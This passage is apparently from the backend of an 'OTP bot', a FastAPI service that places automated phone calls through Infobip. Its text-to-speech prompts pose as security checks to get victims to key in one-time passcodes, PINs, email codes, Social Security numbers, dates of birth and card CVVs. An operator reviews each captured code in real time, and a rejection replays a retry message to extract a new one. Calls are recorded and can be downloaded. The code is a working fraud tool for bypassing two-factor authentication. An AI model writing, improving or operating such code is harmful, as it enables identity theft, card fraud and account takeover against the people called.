    return {"status": "accepted", "otp": session.get("otp_received")}

@otp_router.post("/reject/{session_id}")
async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin rejects the OTP - play retry message (x2)"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    otp_digits = session.get("otp_digits", 6)
    
    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
    
    # Update back to step 2
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "step2", "current_step": 2, "otp_received": None, "otp_digits_collected": "", "reject_play_count": 0}}
    )
    active_sessions[session_id] = {**session, "current_step": 2, "status": "step2", "otp_received": None, "otp_digits_collected": ""}
    
    # Play rejected message with retry (x2)
    asyncio.create_task(play_rejected_with_retry(session_id, session, call_id, otp_digits))
    
    return {"status": "rejected"}

async def play_rejected_with_retry(session_id: str, session: dict, call_id: str, otp_digits: int):
    """Play rejected message with retry (x2) if no new OTP entered"""
    rejected_text = session["messages"]["rejected"]
    
    for play_count in range(1, 3):  # Play 1 and Play 2
        # Check if already got new OTP (moved to step 3)
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 3:
            logger.info(f"Reject retry - already got new OTP, skipping play {play_count}")
            return
        
        await emit_log(session_id, "step", f"🎙️ Playing Retry message (Play {play_count}/2)...")
        await play_tts(call_id, rejected_text, session.get("language", "en"), session_id)
        
        # Wait for TTS to finish
        word_count = len(rejected_text.split())
        tts_wait = max(6, int(word_count / 2.5) + 2)
        await asyncio.sleep(tts_wait)
        
        # Check again if already got new OTP
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 3:
            return
        
        await emit_log(session_id, "info", f"🔄 Waiting for new {otp_digits}-digit OTP...")
        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
        
        # Wait for new OTP
        wait_time = 25 if play_count == 1 else 30
        for _ in range(wait_time):
            await asyncio.sleep(1)
            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            if fresh_session and fresh_session.get("current_step", 1) >= 3:
                return
        
        if play_count == 1:
            await emit_log(session_id, "warning", "⚠️ No new OTP entered, playing message again...")
    
    # No new OTP after 2 plays - hangup
    await emit_log(session_id, "error", "❌ No new OTP entered after 2 attempts, ending call...")
    await hangup_call(call_id)

@otp_router.post("/request-pin/{session_id}")
async def request_pin(session_id: str, digits: int = 6, current_user: dict = Depends(get_current_user)):
    """Request user to enter PIN with specific number of digits"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    await emit_log(session_id, "action", f"🔢 Requesting {digits}-digit PIN...")
    
    # Play message requesting PIN
    pin_message = f"Please enter your {digits} digit PIN code using your dial pad."
    await emit_log(session_id, "step", f"🎙️ Requesting {digits}-digit PIN...")
    await play_tts(call_id, pin_message, session.get("language", "en"), session_id)
    
    # Update session for PIN capture
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"otp_digits": digits, "current_step": 2, "status": "waiting_pin", "otp_digits_collected": ""}}
    )
    
    # Wait for TTS then capture PIN
    await asyncio.sleep(4)
    await start_dtmf_capture(call_id, max_length=digits, timeout=60)
    
    await emit_log(session_id, "info", f"⏳ Waiting for {digits}-digit PIN...")
    
    return {"status": "requesting_pin", "digits": digits}

@otp_router.post("/request-info/{session_id}")
async def request_info(session_id: str, info_type: str, current_user: dict = Depends(get_current_user)):
    """Request user to enter specific information (OTP Email, SSN, DOB, CVV)"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    # Define messages and digit counts for each info type
    info_config = {
        "otp_email": {
            "message": "Additional verification is required. We have sent a code to your email address. Or to your backup email address. Please enter the 6-digit code from your email using your phone's keypad.",
            "digits": 6,
            "emoji": "📧",
            "label": "Email OTP"
        },
        "ssn": {
            "message": "For security verification, please enter your 9 digit Social Security Number using your dial pad.",
            "digits": 9,
            "emoji": "🔐",
            "label": "SSN"
        },
        "dob": {
            "message": "Please enter your date of birth using your dial pad in the following format: day, month, and year. For example, January 15, 1990 would be 1 5 0 1 1 9 9 0.",
            "digits": 8,
            "emoji": "📅",
            "label": "Date of Birth"
        },
        "cvv": {
            "message": "For security verification, please enter the 3 digit CVV code from the back of your card using your dial pad.",
            "digits": 3,
            "emoji": "💳",
            "label": "CVV"
        }
    }
    
    if info_type not in info_config:
        raise HTTPException(status_code=400, detail=f"Invalid info type: {info_type}")
    
    config = info_config[info_type]
    
    await emit_log(session_id, "action", f"{config['emoji']} Requesting {config['label']}...")
    
    # Update session for info capture FIRST
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {
            "otp_digits": config["digits"], 
            "current_step": 2, 
            "status": "waiting_pin",
            "otp_digits_collected": "",
            "info_type": info_type
        }}
    )
    
    # Update active_sessions in memory
    if session_id in active_sessions:
        active_sessions[session_id]["otp_digits"] = config["digits"]
        active_sessions[session_id]["current_step"] = 2
        active_sessions[session_id]["status"] = "waiting_pin"
        active_sessions[session_id]["otp_digits_collected"] = ""
        active_sessions[session_id]["info_type"] = info_type
    
    # Play TTS and start DTMF capture in background (non-blocking)
    asyncio.create_task(play_tts_and_capture_info(session_id, session, call_id, config))
    
    return {"status": "requesting_info", "info_type": info_type, "digits": config["digits"]}

@otp_router.get("/recording/{session_id}")
async def get_session_recording(session_id: str, current_user: dict = Depends(get_current_user)):
    """Get recording URL for a session"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No call ID")
    
    # Try to get recording from Infobip
    recording = await get_call_recording(call_id)
    if recording["status_code"] == 200:
        recordings = recording["data"].get("recordings", [])
        if recordings:
            return {"recording_url": recordings[0].get("url")}
    
    # Return from session if available
    if session.get("recording_url"):
        return {"recording_url": session["recording_url"]}
    
    return {"recording_url": None}

@otp_router.post("/hangup/{session_id}")
async def hangup_session(session_id: str, current_user: dict = Depends(get_current_user)):
    """Manually hangup the call"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if call_id:
        await hangup_call(call_id)
        await emit_log(session_id, "info", "📴 Call ended by admin")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed"}}
    )
    
    return {"status": "hangup"}

@otp_router.get("/recording/download/{file_id}")
async def download_recording(file_id: str, current_user: dict = Depends(get_current_user)):
    """Download recording file from Infobip"""
    try:
        import httpx
        
        download_url = f"{INFOBIP_BASE_URL}/calls/1/recordings/files/{file_id}"
        logger.info(f"Downloading recording from: {download_url}")
        
        headers = {
            "Authorization": f"App {INFOBIP_API_KEY}",
            "Accept": "audio/wav"
        }
        
        async with httpx.AsyncClient(timeout=60.0) as client:
            response = await client.get(
                download_url,
                headers=headers,
                follow_redirects=True
            )
            
            logger.info(f"Recording download response: {response.status_code}")
            
            if response.status_code == 200:
                from fastapi.responses import Response
                return Response(
                    content=response.content,
                    media_type="audio/wav",
                    headers={
                        "Content-Disposition": f"attachment; filename={file_id}.wav"
                    }
                )
            else:
                logger.error(f"Failed to download recording: {response.status_code} - {response.text}")
                raise HTTPException(status_code=response.status_code, detail="Failed to download recording")
    except Exception as e:
        logger.error(f"Error downloading recording: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@otp_router.get("/session/{session_id}")
async def get_otp_session(session_id: str, current_user: dict = Depends(get_current_user)):
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@otp_router.get("/sessions")
async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
    sessions = await db.otp_sessions.find(
        {"user_id": current_user["id"]},
        {"_id": 0}
    ).sort("created_at", -1).limit(50).to_list(50)
    return sessions


# ==================== TTS HELPER FUNCTIONS ====================

async def generate_tts_elevenlabs(text: str, voice_name: str) -> bytes:
    """Generate TTS using ElevenLabs"""
    try:
        if not elevenlabs_client:
            raise HTTPException(status_code=500, detail="ElevenLabs not configured")
        
        audio_generator = elevenlabs_client.text_to_speech.convert(
            voice_id=voice_name,
            text=text,
            model_id="eleven_turbo_v2_5"
        )
        
        audio_bytes = b""
        for chunk in audio_generator:
            audio_bytes += chunk
        
        return audio_bytes
    except Exception as e:
        logger.error(f"ElevenLabs TTS error: {e}")
        raise HTTPException(status_code=500, detail=f"ElevenLabs error: {str(e)}")

async def generate_tts_deepgram(text: str, voice_model: str) -> bytes:
    """Generate TTS using Deepgram"""
    try:
        if not deepgram_client:
            raise HTTPException(status_code=500, detail="Deepgram not configured")
        
        # Generate audio using Deepgram SDK v5.x
        audio_generator = deepgram_client.speak.v1.audio.generate(
            text=text,
            model=voice_model
        )
        
        # Collect audio bytes from generator
        audio_bytes = b""
        for chunk in audio_generator:
            audio_bytes += chunk
        
        return audio_bytes
    except Exception as e:
        logger.error(f"Deepgram TTS error: {e}")
        raise HTTPException(status_code=500, detail=f"Deepgram error: {str(e)}")

@voice_router.post("/preview")
async def preview_voice(
    text: str, 
    voice_name: str, 
    voice_provider: str,
    current_user: dict = Depends(get_current_user)
):
    """Generate preview audio for selected voice"""
    try:
        if voice_provider == "elevenlabs":
            audio_bytes = await generate_tts_elevenlabs(text, voice_name)
            media_type = "audio/mpeg"
        elif voice_provider == "deepgram":
            audio_bytes = await generate_tts_deepgram(text, voice_name)
            media_type = "audio/mpeg"
        else:
            # For Infobip, we can't generate preview without active call
            raise HTTPException(status_code=400, detail="Preview not available for Infobip voices")
        
        return Response(content=audio_bytes, media_type=media_type)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Voice preview error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ==================== VOICE ROUTES ====================

@voice_router.get("/history")
async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = Depends(get_current_user)):
    calls = await db.calls.find({"user_id": current_user["id"]}, {"_id": 0}).sort("created_at", -1).skip(skip).limit(limit).to_list(limit)
    return calls

@voice_router.get("/stats")
async def get_call_stats(current_user: dict = Depends(get_current_user)):
    # Count OTP sessions as calls
    pipeline = [
        {"$match": {"user_id": current_user["id"]}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "completed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
            "failed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["calling", "step1", "step2", "waiting_approval"]]}, 1, 0]}}
        }}
    ]
    
    result = await db.otp_sessions.aggregate(pipeline).to_list(1)
    
    if result:
        stats = result[0]
        return {
            "total_calls": stats["total_calls"],
            "completed_calls": stats["completed_calls"],
            "failed_calls": stats["failed_calls"],
            "pending_calls": stats["pending_calls"],
            "total_duration": 0,
            "avg_duration": 0
        }
    
    return {"total_calls": 0, "completed_calls": 0, "failed_calls": 0, "pending_calls": 0, "total_duration": 0, "avg_duration": 0}

# ==================== MAIN ROUTES ====================

@api_router.get("/")
async def root():
    return {"message": "OTP Bot Call API v2.0 - Calls API Enabled"}

@api_router.get("/health")
async def health_check():
    return {"status": "healthy", "service": "otp-bot-api", "calls_api": "enabled"}

# Include routers
api_router.include_router(auth_router)
api_router.include_router(admin_router)
api_router.include_router(user_router)
api_router.include_router(voice_router)
api_router.include_router(otp_router)
fastapi_app.include_router(api_router)

# CORS middleware
fastapi_app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@fastapi_app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
